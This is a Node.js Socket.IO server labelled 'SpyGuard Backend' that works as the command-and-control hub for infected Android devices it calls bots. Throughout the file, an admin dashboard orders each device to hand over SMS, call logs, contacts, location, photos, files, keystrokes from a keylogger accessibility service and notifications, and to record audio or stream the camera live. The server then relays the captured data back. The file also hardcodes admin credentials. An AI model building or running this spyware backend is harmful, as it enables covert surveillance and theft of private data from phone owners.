const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public'))); // Serve dashboard files

// Redirect root to login
app.get('/', (req, res) => {
    res.redirect('/login.html');
});

// Create directories for received data
const dataDir = path.join(__dirname, 'received_data');
['screenshots', 'audio', 'files', 'photos'].forEach(dir => {
    const dirPath = path.join(dataDir, dir);
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
});

// ===== DATA STORAGE =====
const AUTHORIZED_USERS = {
    'admin@yourapp.com': {
        password: 'yourSecurePassword123',
        name: 'Admin User',
        role: 'admin'
    }
};

let connectedBots = [];
let adminSocket = null;

// ===== HELPER FUNCTIONS =====
function validateCredentials(email, password) {
    if (!email || !password) return false;
    const user = AUTHORIZED_USERS[email];
    return user && user.password === password;
}

function log(type, message, data = '') {
    const timestamp = new Date().toLocaleTimeString();
    const icons = {
        info: 'ℹ️',
        success: '✅',
        error: '❌',
        bot: '📱',
        admin: '👤',
        connect: '🔌',
        command: '⚡'
    };
    console.log(`[${timestamp}] ${icons[type] || '•'} ${message}`, data);
}

// ===== REST API ROUTES =====
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        connectedBots: connectedBots.length,
        adminConnected: adminSocket !== null && adminSocket.connected
    });
});

app.get('/api/bots', (req, res) => {
    res.json({
        count: connectedBots.length,
        bots: connectedBots.map(b => ({
            uid: b.uid,
            device: b.device,
            phone: b.phone,
            provider: b.provider,
            sdk: b.sdk,
            version: b.version,
            location: b.location,
            status: 'online',
            connectedAt: b.connectedAt
        }))
    });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    if (validateCredentials(email, password)) {
        const user = AUTHORIZED_USERS[email];
        res.json({
            success: true,
            user: { email, name: user.name, role: user.role }
        });
    } else {
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

// Test endpoint to send keylog data to a specific device
app.post('/api/test/keylog/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const keylogData = req.body;
    
    // Find the bot socket - compatible with different Socket.IO versions
    let botSocket = null;
    const sockets = io.of('/').sockets;
    
    // Try different methods based on Socket.IO version
    if (sockets instanceof Map) {
        // Socket.IO v4+
        for (const [id, socket] of sockets) {
            if (socket.botUID === deviceId) {
                botSocket = socket;
                break;
            }
        }
    } else {
        // Socket.IO v2/v3
        Object.values(sockets).forEach(socket => {
            if (socket && socket.botUID === deviceId) {
                botSocket = socket;
            }
        });
    }
    
    if (!botSocket) {
        return res.status(404).json({ error: 'Device not found', deviceId });
    }
    
    // Emit command to get keylogs
    botSocket.emit('command', {
        command: 'getKeylog',
        arg1: keylogData.arg1 || 'get',
        arg2: keylogData.arg2 || '',
        arg3: keylogData.arg3 || '',
        arg4: keylogData.arg4 || ''
    });
    
    res.json({ 
        success: true, 
        message: 'Command sent to device',
        deviceId,
        command: 'getKeylog'
    });
});

// Test endpoint to simulate receiving keylog data from device
app.post('/api/test/receive-keylog', (req, res) => {
    const keylogData = req.body;
    
    // Simulate data coming from device
    if (adminSocket && adminSocket.connected) {
        adminSocket.emit('keylogData', {
            uniqueId: 'TEST_DEVICE',
            data: keylogData.keylogs || keylogData
        });
        res.json({ 
            success: true, 
            message: 'Keylog data sent to admin dashboard',
            entriesCount: Array.isArray(keylogData.keylogs) ? keylogData.keylogs.length : 1
        });
    } else {
        res.status(503).json({ error: 'Admin dashboard not connected' });
    }
});

// Get current keylog data (for testing)
app.get('/api/test/keylog-sample', (req, res) => {
    const sampleData = {
        dataType: 'keylog',
        action: 'get',
        keylogs: [
            {
                app: 'WhatsApp',
                appName: 'WhatsApp',
                text: 'Hello from curl test',
                key: 'Hello from curl test',
                timestamp: Date.now() - 5000
            },
            {
                app: 'Chrome',
                appName: 'Google Chrome',
                text: 'google.com/search',
                key: 'google.com/search',
                timestamp: Date.now() - 3000
            },
            {
                app: 'Gmail',
                appName: 'Gmail',
                text: 'Test email content',
                key: 'Test email content',
                timestamp: Date.now() - 1000
            }
        ],
        totalEntries: 3,
        startDate: '2025-12-26',
        endDate: '2025-12-26',
        timestamp: Date.now()
    };
    
    res.json(sampleData);
});

// ===== SOCKET.IO HANDLERS =====
io.on('connection', (socket) => {
    log('connect', `New connection: ${socket.id}`);

    // Admin Registration (from React frontend)
    socket.on('adminRegistration', (data) => {
        log('admin', `Admin connected: ${data.email || 'unknown'}`);
        socket.isAdmin = true;
        socket.email = data.email;
        adminSocket = socket;
        
        // Send current bot list to admin (in format React expects)
        const botListForFrontend = connectedBots.map(b => ({
            uniqueId: b.uid || b.uniqueId,
            model: b.device || b.model,
            manufacturer: b.manufacturer || 'Unknown',
            androidVersion: b.sdk || b.androidVersion,
            batteryLevel: b.battery || b.batteryLevel || 100,
            networkType: b.provider || b.networkType || 'Unknown',
            phoneNumber: b.phone || b.phoneNumber,
            online: true,
            connectedAt: b.connectedAt,
            socketId: b.socketId
        }));
        
        socket.emit('botList', botListForFrontend);
        log('success', `Admin authenticated, sent ${botListForFrontend.length} bots`);
    });

    // Legacy Admin Registration (with credentials)
    socket.on('registerAdmin', (data) => {
        log('admin', `Admin login attempt: ${data.email}`);
        
        if (!validateCredentials(data.email, data.password)) {
            log('error', 'Invalid admin credentials');
            socket.emit('auth-error', { error: 'Invalid email or password' });
            return;
        }

        socket.isAdmin = true;
        socket.email = data.email;
        adminSocket = socket;
        
        log('success', `Admin authenticated: ${data.email}`);

        // Send current bot list to admin
        socket.emit('botList', {
            bots: connectedBots,
            authenticated: true,
            user: {
                email: data.email,
                name: AUTHORIZED_USERS[data.email].name,
                role: AUTHORIZED_USERS[data.email].role
            }
        });
    });

    // Get bot list request
    socket.on('getBotList', () => {
        const botListForFrontend = connectedBots.map(b => ({
            uniqueId: b.uid || b.uniqueId,
            model: b.device || b.model,
            manufacturer: b.manufacturer || 'Unknown',
            androidVersion: b.sdk || b.androidVersion,
            batteryLevel: b.battery || b.batteryLevel || 100,
            networkType: b.provider || b.networkType || 'Unknown',
            phoneNumber: b.phone || b.phoneNumber,
            online: true,
            connectedAt: b.connectedAt,
            socketId: b.socketId
        }));
        socket.emit('botList', botListForFrontend);
    });

    // Bot Registration
    socket.on('registerBot', (data) => {
        log('bot', `Bot connection: ${data.device}`);
        
        if (!validateCredentials(data.email, data.password)) {
            log('error', 'Invalid bot credentials');
            socket.emit('auth-error', { error: 'Invalid credentials' });
            socket.disconnect();
            return;
        }

        // Store bot data
        const bot = {
            ...data,
            uniqueId: data.uid,
            model: data.device,
            socketId: socket.id,
            connectedAt: new Date().toISOString()
        };
        
        // Remove old entry if exists
        connectedBots = connectedBots.filter(b => b.uid !== data.uid);
        connectedBots.push(bot);
        
        socket.isBot = true;
        socket.botUID = data.uid;
        
        log('success', `Bot registered: ${data.device} (${data.uid})`);

        // Notify admin of new bot (format for React frontend)
        if (adminSocket && adminSocket.connected) {
            const botForFrontend = {
                uniqueId: bot.uid || bot.uniqueId,
                model: bot.device || bot.model,
                manufacturer: bot.manufacturer || 'Unknown',
                androidVersion: bot.sdk || bot.androidVersion,
                batteryLevel: bot.battery || bot.batteryLevel || 100,
                networkType: bot.provider || bot.networkType || 'Unknown',
                phoneNumber: bot.phone || bot.phoneNumber,
                online: true,
                connectedAt: bot.connectedAt,
                socketId: bot.socketId
            };
            adminSocket.emit('newBot', botForFrontend);
        }

        // Setup bot data handlers
        setupBotDataHandlers(socket);
    });

    // Admin command (from React frontend)
    socket.on('adminCommand', (data) => {
        const { command, targetUniqueId, ...params } = data;
        log('command', `Command ${command} to ${targetUniqueId}`);

        const targetBot = connectedBots.find(b => (b.uid === targetUniqueId) || (b.uniqueId === targetUniqueId));
        if (!targetBot) {
            log('error', `Bot not found: ${targetUniqueId}`);
            socket.emit('commandError', { error: 'Bot not found' });
            return;
        }

        const botSocket = io.sockets.connected[targetBot.socketId];
        if (botSocket) {
            // Map dashboard commands to Android app commands
            const commandMap = {
                'getSms': { command: 'getSms', arg1: params.count || 100 },
                'getCallLogs': { command: 'getCallHistory', arg1: params.count || 50 },
                'getContacts': { command: 'getContacts' },
                'getLocation': { command: 'getLocation' },
                'takeScreenshot': { command: 'takeScreenShot' },
                'getPhotos': { command: 'getImages' },
                'getFiles': { command: 'fileExplorer', arg1: 'list', arg2: params.path || '/storage/emulated/0' },
                'downloadFile': { command: 'fileExplorer', arg1: 'download', arg2: params.path },
                'getInstalledApps': { command: 'getInstalledApps' },
                'getKeylog': { command: 'getKeylog' },
                'getNotifications': { command: 'getNotifications' },
                'recordAudio': { command: 'recordAudio', arg1: params.duration || 30 },
                'streamCamera': { command: 'streamCamera', arg1: params.cameraType || 'back' },
                'startWebRTCStream': { command: 'startWebRTCStream', arg1: params.cameraType || 'back' },
                'stopWebRTCStream': { command: 'stopWebRTCStream' }
            };
            
            const androidCommand = commandMap[command];
            if (androidCommand) {
                // Send as JSONArray format that Android expects
                botSocket.emit('commands', [androidCommand]);
                log('success', `Command ${command} sent to ${targetBot.device || targetBot.model}${params.cameraType ? ' ('+params.cameraType+' camera)' : ''}${params.duration ? ' ('+params.duration+'s)' : ''}`);
                log('info', `Command details: ${JSON.stringify(androidCommand)}`);
            } else {
                log('error', `Unknown command: ${command}`);
                socket.emit('commandError', { error: 'Unknown command' });
            }
        } else {
            socket.emit('commandError', { error: 'Bot disconnected' });
        }
    });

    // Legacy admin command
    socket.on('sendCommand', (data) => {
        const { targetUID, commands } = data;
        log('command', `Command to ${targetUID}:`, commands);

        const targetBot = connectedBots.find(b => b.uid === targetUID);
        if (!targetBot) {
            socket.emit('commandError', { error: 'Bot not found' });
            return;
        }

        const botSocket = io.sockets.connected[targetBot.socketId];
        if (botSocket) {
            botSocket.emit('commands', commands);
            log('success', `Command sent to ${targetBot.device}`);
        } else {
            socket.emit('commandError', { error: 'Bot disconnected' });
        }
    });
    
    // ===== WebRTC Signaling from Admin =====
    
    // Handle WebRTC answer from admin dashboard
    socket.on('webrtc-answer', (data) => {
        log('info', `📹 WebRTC answer from admin for ${data.uid}`);
        const targetBot = connectedBots.find(b => (b.uid === data.uid) || (b.uniqueId === data.uid));
        if (targetBot) {
            const botSocket = io.sockets.connected[targetBot.socketId];
            if (botSocket) {
                botSocket.emit('webrtc-answer', {
                    answer: data.answer
                });
                log('success', `📹 WebRTC answer forwarded to ${targetBot.device}`);
            } else {
                log('error', 'Bot socket not found for WebRTC answer');
            }
        } else {
            log('error', `Bot not found for WebRTC answer: ${data.uid}`);
        }
    });
    
    // Handle ICE candidates from admin dashboard
    socket.on('webrtc-ice-candidate-admin', (data) => {
        log('info', `🧊 ICE candidate from admin for ${data.uid}`);
        const targetBot = connectedBots.find(b => (b.uid === data.uid) || (b.uniqueId === data.uid));
        if (targetBot) {
            const botSocket = io.sockets.connected[targetBot.socketId];
            if (botSocket) {
                botSocket.emit('webrtc-ice-candidate', {
                    candidate: data.candidate
                });
            }
        }
    });

    // Disconnect handler
    socket.on('disconnect', () => {
        if (socket.isAdmin) {
            log('admin', 'Admin disconnected');
            adminSocket = null;
        }
        
        if (socket.isBot) {
            const bot = connectedBots.find(b => b.socketId === socket.id);
            if (bot) {
                log('bot', `Bot disconnected: ${bot.device || bot.model}`);
                connectedBots = connectedBots.filter(b => b.socketId !== socket.id);
                
                // Notify admin (format for React frontend)
                if (adminSocket && adminSocket.connected) {
                    adminSocket.emit('botDisconnected', { 
                        uniqueId: bot.uid || bot.uniqueId
                    });
                }
            }
        }
    });
});

// Setup handlers for data from bots
function setupBotDataHandlers(socket) {
    // Receive user data from bot
    socket.on('usrData', (data) => {
        try {
            const dataType = data.dataType;
            log('info', `Data from ${socket.botUID}: ${dataType}`);
            
            // Log raw data for debugging
            if (dataType === 'sms' || dataType === 'contacts' || dataType === 'callLog') {
                log('info', `Raw ${dataType} data type: ${typeof data[dataType]}, length: ${data[dataType]?.length || 'N/A'}`);
            }
            
            // Parse and forward based on dataType
            if (adminSocket && adminSocket.connected) {
                switch (dataType) {
                    case 'sms':
                        try {
                            const smsData = typeof data.sms === 'string' ? JSON.parse(data.sms) : (data.sms || []);
                            log('info', `SMS data parsed: ${smsData.length} messages`);
                            adminSocket.emit('smsData', { 
                                uniqueId: socket.botUID, 
                                data: smsData 
                            });
                        } catch (err) {
                            log('error', `Error parsing SMS data: ${err.message}`);
                            adminSocket.emit('smsData', { 
                                uniqueId: socket.botUID, 
                                data: [] 
                            });
                        }
                        break;
                        
                    case 'callLog':
                        try {
                            const callData = typeof data.callLog === 'string' ? JSON.parse(data.callLog) : (data.callLog || []);
                            log('info', `Call log data parsed: ${callData.length} calls`);
                            adminSocket.emit('callLogData', { 
                                uniqueId: socket.botUID, 
                                data: callData 
                            });
                        } catch (err) {
                            log('error', `Error parsing call log data: ${err.message}`);
                            adminSocket.emit('callLogData', { 
                                uniqueId: socket.botUID, 
                                data: [] 
                            });
                        }
                        break;
                        
                    case 'contacts':
                        try {
                            const contactsData = typeof data.contacts === 'string' ? JSON.parse(data.contacts) : (data.contacts || []);
                            log('info', `Contacts data parsed: ${contactsData.length} contacts`);
                            adminSocket.emit('contactsData', { 
                                uniqueId: socket.botUID, 
                                data: contactsData 
                            });
                        } catch (err) {
                            log('error', `Error parsing contacts data: ${err.message}`);
                            adminSocket.emit('contactsData', { 
                                uniqueId: socket.botUID, 
                                data: [] 
                            });
                        }
                        break;
                        
                    case 'location':
                        const locationData = JSON.parse(data.location || '{}');
                        adminSocket.emit('locationData', { 
                            uniqueId: socket.botUID, 
                            data: {
                                latitude: locationData.lat,
                                longitude: locationData.lon,
                                accuracy: locationData.accuracy
                            }
                        });
                        break;
                        
                    case 'downloadImage':
                    case 'screenShot':
                        adminSocket.emit('screenshot', { 
                            uniqueId: socket.botUID, 
                            data: {
                                image: data.image64,
                                name: data.name
                            }
                        });
                        break;
                        
                    case 'photosList':
                        const photosData = typeof data.photos === 'string' ? JSON.parse(data.photos) : data.photos;
                        adminSocket.emit('photoData', { 
                            uniqueId: socket.botUID, 
                            data: photosData,
                            batchIndex: data.batchIndex,
                            totalBatches: data.totalBatches,
                            batchSize: data.batchSize
                        });
                        break;
                    
                    case 'photosComplete':
                        adminSocket.emit('photosComplete', {
                            uniqueId: socket.botUID,
                            totalImages: data.totalImages,
                            message: data.message
                        });
                        break;
                        
                    case 'filesList':
                    case 'fileExplorer':
                        const filesData = typeof data.files === 'string' ? JSON.parse(data.files) : data.files;
                        
                        // Handle different file explorer actions
                        if (data.action === 'download' && data.fileData) {
                            // File download response
                            adminSocket.emit('fileDownload', { 
                                uniqueId: socket.botUID,
                                fileName: data.fileName,
                                fileData: data.fileData,
                                filePath: data.filePath,
                                fileSize: data.fileSize,
                                mimeType: data.mimeType
                            });
                        } else {
                            // File list response
                            adminSocket.emit('fileListData', { 
                                uniqueId: socket.botUID, 
                                data: filesData,
                                currentPath: data.currentPath
                            });
                        }
                        break;
                        
                    case 'installedApps':
                        // Handle both single-shot and batched app data
                        if (data.batch) {
                            // Batched data
                            const batchData = typeof data.batch === 'string' ? JSON.parse(data.batch) : data.batch;
                            adminSocket.emit('installedAppsData', { 
                                uniqueId: socket.botUID, 
                                batch: batchData,
                                batchIndex: data.batchIndex,
                                totalBatches: data.totalBatches,
                                totalApps: data.totalApps,
                                isComplete: data.isComplete
                            });
                        } else {
                            // Single-shot data (legacy)
                            const appsData = typeof data.apps === 'string' ? JSON.parse(data.apps) : data.apps;
                            adminSocket.emit('installedAppsData', { 
                                uniqueId: socket.botUID, 
                                data: appsData 
                            });
                        }
                        break;
                        
                    case 'keylog':
                        // Handle both single keylog entry (real-time) and array (batch)
                        let keylogEntries = [];
                        if (data.keylogs) {
                            // Batch data from getKeylog command
                            keylogEntries = typeof data.keylogs === 'string' ? JSON.parse(data.keylogs) : data.keylogs;
                        } else if (data.text || data.content) {
                            // Single real-time entry from KeyloggerAccessibilityService
                            keylogEntries = [{
                                timestamp: data.timestamp,
                                app: data.package || 'Unknown',
                                appName: data.package || 'Unknown',
                                text: data.text || data.content || '',
                                type: data.type || 'keystroke',
                                className: data.className
                            }];
                        }
                        
                        adminSocket.emit('keylogData', { 
                            uniqueId: socket.botUID, 
                            data: keylogEntries
                        });
                        break;
                        
                    case 'notification':
                    case 'notifications':
                        // Handle both single notification (real-time) and array (batch)
                        let notifEntries = [];
                        if (data.notifications) {
                            // Batch data from getNotifications command
                            notifEntries = typeof data.notifications === 'string' ? JSON.parse(data.notifications) : data.notifications;
                        } else {
                            // Single real-time entry from NotificationReadService
                            notifEntries = [{
                                timestamp: data.postTime || data.timestamp,
                                app: data.packageName || 'Unknown',
                                appName: data.packageName || 'Unknown',
                                title: data.title || '',
                                text: data.text || data.bigText || '',
                                message: data.text || data.bigText || '',
                                packageName: data.packageName,
                                id: data.id
                            }];
                        }
                        
                        adminSocket.emit('notificationData', { 
                            uniqueId: socket.botUID, 
                            data: notifEntries
                        });
                        break;
                        
                    case 'audio':
                        // Handle audio recording from device
                        log('info', `Received audio recording from ${socket.botUID}: ${data.fileName}`);
                        adminSocket.emit('audioRecording', { 
                            uniqueId: socket.botUID, 
                            data: {
                                fileName: data.fileName,
                                fileSize: data.fileSize,
                                duration: data.duration,
                                audioData: data.audioData,
                                timestamp: data.timestamp,
                                error: data.error
                            }
                        });
                        break;
                        
                    case 'camera':
                        // Handle camera photo from device
                        log('info', `Received camera photo from ${socket.botUID}: ${data.fileName}`);
                        adminSocket.emit('cameraPhoto', { 
                            uniqueId: socket.botUID, 
                            data: {
                                fileName: data.fileName,
                                fileSize: data.fileSize,
                                cameraType: data.cameraType,
                                imageData: data.imageData,
                                timestamp: data.timestamp,
                                error: data.error
                            }
                        });
                        break;
                        
                    case 'audioRecording':
                        adminSocket.emit('audioRecording', { 
                            uniqueId: socket.botUID, 
                            data: {
                                audio: data.audio,
                                duration: data.duration
                            }
                        });
                        break;
                    
                    case 'error':
                        // Handle error messages from device
                        log('error', `Device error (${data.command}): ${data.error}`);
                        adminSocket.emit('deviceError', {
                            uniqueId: socket.botUID,
                            command: data.command,
                            error: data.error
                        });
                        break;
                        
                    default:
                        log('info', `Unknown dataType: ${dataType}`);
                        adminSocket.emit('botData', {
                            uniqueId: socket.botUID,
                            dataType: dataType,
                            data: data
                        });
                }
            }
        } catch (err) {
            log('error', `Error processing usrData: ${err.message}`);
        }
    });

    // Legacy event handlers (in case some tasks use these directly)
    socket.on('smsData', (data) => {
        forwardToAdmin('smsData', socket.botUID, data);
    });

    socket.on('callLogData', (data) => {
        forwardToAdmin('callLogData', socket.botUID, data);
    });

    socket.on('contactsData', (data) => {
        forwardToAdmin('contactsData', socket.botUID, data);
    });

    socket.on('locationData', (data) => {
        forwardToAdmin('locationData', socket.botUID, data);
    });

    socket.on('screenshotData', (data) => {
        forwardToAdmin('screenshot', socket.botUID, data);
    });

    socket.on('photosData', (data) => {
        forwardToAdmin('photoData', socket.botUID, data);
    });

    socket.on('filesData', (data) => {
        forwardToAdmin('fileListData', socket.botUID, data);
    });

    socket.on('appsData', (data) => {
        forwardToAdmin('installedAppsData', socket.botUID, data);
    });

    socket.on('keylogData', (data) => {
        forwardToAdmin('keylogData', socket.botUID, data);
    });

    socket.on('notificationData', (data) => {
        forwardToAdmin('notificationData', socket.botUID, data);
    });

    socket.on('audioData', (data) => {
        log('info', `Received audio from ${socket.botUID}`);
        forwardToAdmin('audioRecording', socket.botUID, data);
    });

    socket.on('cameraData', (data) => {
        log('info', `Received camera photo from ${socket.botUID}`);
        forwardToAdmin('cameraPhoto', socket.botUID, data);
    });
    
    // ===== WebRTC Signaling Handlers =====
    
    // Handle WebRTC offer from Android device
    socket.on('webrtc-offer', (data) => {
        log('info', `📹 WebRTC offer received from ${socket.botUID}`);
        if (adminSocket && adminSocket.connected) {
            adminSocket.emit('webrtc-offer', {
                uid: socket.botUID,
                offer: data.offer,
                cameraType: data.cameraType
            });
            log('success', `📹 WebRTC offer forwarded to admin`);
        } else {
            log('error', 'No admin connected to receive WebRTC offer');
        }
    });
    
    // Handle ICE candidates from Android device
    socket.on('webrtc-ice-candidate', (data) => {
        log('info', `🧊 ICE candidate received from ${socket.botUID}`);
        if (adminSocket && adminSocket.connected) {
            adminSocket.emit('webrtc-ice-candidate', {
                uid: socket.botUID,
                candidate: data.candidate
            });
        }
    });
    
    // Handle WebRTC errors from Android device
    socket.on('webrtc-error', (data) => {
        log('error', `📹 WebRTC error from ${socket.botUID}: ${data.error}`);
        if (adminSocket && adminSocket.connected) {
            adminSocket.emit('webrtc-error', {
                uid: socket.botUID,
                error: data.error
            });
        }
    });
}

function forwardToAdmin(event, uid, data) {
    if (adminSocket && adminSocket.connected) {
        log('info', `Forwarding ${event} from ${uid}`);
        adminSocket.emit(event, { 
            uniqueId: uid, 
            data: data.data || data 
        });
    }
}

// ===== START SERVER =====
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
    console.log('\n' + '='.repeat(50));
    console.log('🚀 SpyGuard Backend Server');
    console.log('='.repeat(50));
    console.log(`📡 Server running on: http://localhost:${PORT}`);
    console.log(`🔌 Socket.IO ready for connections`);
    console.log(`🔐 API endpoints:`);
    console.log(`   - GET  /api/health`);
    console.log(`   - GET  /api/bots`);
    console.log(`   - POST /api/login`);
    console.log(`⏰ Started at: ${new Date().toLocaleString()}`);
    console.log('='.repeat(50) + '\n');
});

module.exports = { app, server, io };
